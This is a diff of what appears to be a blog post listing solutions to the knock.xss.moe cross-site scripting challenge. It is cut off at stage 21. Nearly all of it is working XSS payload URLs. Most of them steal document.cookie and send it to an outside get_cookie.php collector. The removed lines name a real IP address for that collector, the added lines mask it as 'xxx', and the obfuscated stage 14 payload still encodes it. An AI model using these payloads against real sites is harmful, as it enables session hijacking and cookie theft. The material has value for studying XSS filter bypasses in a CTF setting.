@@ -6,7 +6,7 @@ All solution
 Ranking #41
 {% highlight html linenos %}
 stage3:
-http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=%22%3E%3Cscript%20language%3D%22JavaScript%22%3Edocument.location%3D%27http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%3D%27%2bdocument.cookie%3B%3C%2fscript%3E
+http://68e3b596ebf790e8a781b8d87b84af7eb7b0aeb3.knock.xss.moe/?q=%22%3E%3Cscript%20language%3D%22JavaScript%22%3Edocument.location%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%3D%27%2bdocument.cookie%3B%3C%2fscript%3E
 
 stage5:
 </textarea><script>alert('xxx')</script>
@@ -15,20 +15,20 @@ stage6:
 </xmp><script>alert('xxx')</script>
 
 stage7:
-http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=%22%20onfocus%3D%22%20location.href%3D%27http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%22%20autofocus%3D%22
+http://8005f6694d2862438bad3715436522e27dbd81a4.knock.xss.moe/?q=%22%20onfocus%3D%22%20location.href%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%22%20autofocus%3D%22
 
 stage8
 
 stage9:
-http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=%00%00%20autofocus%20onfocus%3Dlocation.href%3D%27http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%27%2bdocument.cookie
+http://e461f5f6c542ae79ccc144093c63d0b074e591cd.knock.xss.moe/?q=%00%00%20autofocus%20onfocus%3Dlocation.href%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie
 
 
 stage10:
-http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:document.location.href='http://118.69.135.163/get_cookie.php?cookie'+document.cookie
+http://811fbf0db9c40565743a37c2978f812b82eb89a6.knock.xss.moe/?q=javascript:document.location.href='http://xxx/get_cookie.php?cookie'+document.cookie
 
 stage11:
 <iframe src="XSS"></iframe>
-http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=javascript%3Adocument.location.href%3D%22http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%22%2bdocument.cookie%3B
+http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=javascript%3Adocument.location.href%3D%22http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%22%2bdocument.cookie%3B
 
 stage12:
 
@@ -43,16 +43,16 @@ stage 14:
 http://8293927d3c84ed42eef26dd9ceaaa3d9bf448dda.knock.xss.moe/?document.domain=%22knock.xss.moe%22;eval(String.fromCharCode(119,%20105,%20110,%20100,%20111,%20119,%2046,%20111,%20112,%20101,%20110,%2040,%2034,%20104,%20116,%20116,%20112,%2058,%2047,%2047,%2049,%2049,%2056,%2046,%2054,%2057,%2046,%2049,%2051,%2053,%2046,%2049,%2054,%2051,%2047,%20103,%20101,%20116,%2095,%2099,%20111,%20111,%20107,%20105,%20101,%2046,%20112,%20104,%20112,%2063,%2099,%20111,%20111,%20107,%20105,%20101,%2061,%2034,%2043,%20112,%2097,%20114,%20101,%20110,%20116,%2046,%20100,%20111,%2099,%20117,%20109,%20101,%20110,%20116,%2046,%2099,%20111,%20111,%20107,%20105,%20101,%2041))
 
 stage 15:
-http://e3bcee011cad77ba066ca7c2ad2884372aec9566.knock.xss.moe/?q=%3Cimg%20src%3D1%20onerror%3Dwindow.location.href%3D%27http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%3B%3E
+http://e3bcee011cad77ba066ca7c2ad2884372aec9566.knock.xss.moe/?q=%3Cimg%20src%3D1%20onerror%3Dwindow.location.href%3D%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%3B%3E
 
 
 stage 17:
-http://34a131df991487bf58d3df0a85e247d396fb93a0.knock.xss.moe/?q=javascript%3Alocation.href%3D%22http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%3D%22%2bdocument.cookie
+http://34a131df991487bf58d3df0a85e247d396fb93a0.knock.xss.moe/?q=javascript%3Alocation.href%3D%22http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%3D%22%2bdocument.cookie
 
 
 stage 19:
-<body onload="alert('XXX, &#039; ,0,window.open(&#039;http://118.69.135.163/get_cookie.php?cookie&#039; document.cookie));"//')">
-http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=1%27%2C0%2Cwindow.open%28%27http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%29%29%3B%2f%2f
+<body onload="alert('XXX, &#039; ,0,window.open(&#039;http://xxx/get_cookie.php?cookie&#039; document.cookie));"//')">
+http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=1%27%2C0%2Cwindow.open%28%27http%3A%2f%2fxxx%2fget_cookie.php%3Fcookie%27%2bdocument.cookie%29%29%3B%2f%2f
 
 
 stage 21:
